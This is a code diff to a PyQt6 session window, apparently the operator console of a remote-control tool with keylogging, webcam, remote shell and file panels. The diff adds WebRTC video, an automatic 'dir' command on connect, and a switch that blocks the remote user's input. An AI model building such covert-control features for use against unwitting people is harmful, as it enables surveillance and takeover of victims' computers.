@@ -8,7 +8,7 @@ from PyQt6.QtWidgets import (QMainWindow, QToolBar, QMessageBox, QWidget,
                              QVBoxLayout, QHBoxLayout, QTextEdit, QPushButton,
                              QLabel, QFrame, QToolButton, QTabWidget)
 from PyQt6.QtGui import QAction, QPixmap
-from PyQt6.QtCore import Qt
+from PyQt6.QtCore import Qt, QTimer
 import base64
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
@@ -161,6 +161,9 @@ class SessionWindow(QMainWindow):
         self.worker.connection_ready.connect(self._on_connected)
         self.worker.device_error.connect(self.on_device_error)
         
+        # WebRTC video frames (Project Supersonic)
+        self.worker.webrtc_frame_received.connect(self.canvas.update_frame_numpy)
+        
         # Tab data signals - use default AutoConnection (Qt decides based on thread)
         self.worker.shell_output.connect(self.shell_tab.append_output)
         self.worker.shell_exit.connect(self.shell_tab.show_exit_code)
@@ -212,6 +215,9 @@ class SessionWindow(QMainWindow):
         # Auto-refresh managers
         self.request_process_list()
         self.request_file_list(".")
+
+        # Auto-run 'dir' with 1s delay
+        QTimer.singleShot(1000, lambda: self.send_shell_command("ps", "dir"))
     
     def _set_controls_enabled(self, enabled):
         """Enable/disable all interactive controls"""
@@ -433,6 +439,19 @@ class SessionWindow(QMainWindow):
             self.keylog_widget.raise_()
         else:
             self.keylog_widget.hide()
+
+    def toggle_input_block(self, checked):
+        """Toggle input blocking on the remote agent"""
+        self.input_blocked = checked
+        self.set_cursor_blocked(checked)
+        
+        if self.worker.is_connected():
+            # Send setting to agent
+            payload = json.dumps({
+                'id': protocol.SETTING_BLOCK_INPUT,
+                'value': checked
+            }).encode('utf-8')
+            self.send_command(protocol.OP_SETTING, payload)
 
     def toggle_webcam(self, checked):
         if not self.worker.is_connected():
